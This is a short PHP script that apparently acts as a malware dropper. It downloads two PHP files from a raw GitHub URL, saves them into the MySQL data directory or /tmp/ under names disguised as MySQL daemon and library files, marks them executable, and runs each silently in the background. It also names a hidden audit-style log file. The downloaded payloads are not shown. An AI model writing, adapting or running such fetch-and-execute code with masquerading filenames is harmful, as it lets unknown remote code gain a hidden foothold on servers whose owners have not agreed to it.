<?php
error_reporting(E_ALL);

$gitBase = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main/";
$targetDir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$sysHash = substr(md5(gethostname()), 0, 4);

$name1 = "mysql_daemon_" . $sysHash . ".php";
$name2 = "mysql_lib_" . $sysHash . ".php";
$logName = ".mysql_audit.log";

$files = [
    "file1.php" => $name1,
    "file2.php" => $name2
];

echo "--- Installation Started ---\n";
foreach ($files as $gitName => $localName) {
    $path = $targetDir . $localName;
    $content = @file_get_contents($gitBase . $gitName);
    if ($content) {
        file_put_contents($path, $content);
        chmod($path, 0755);
        echo "[+] Created: $path\n";
        exec("/usr/bin/php $path > /dev/null 2>&1 &");
    } else {
        echo "[!] Error: Could not download $gitName\n";
    }
}

echo "[i] Shared Log Path: " . $targetDir . $logName . "\n";
?>
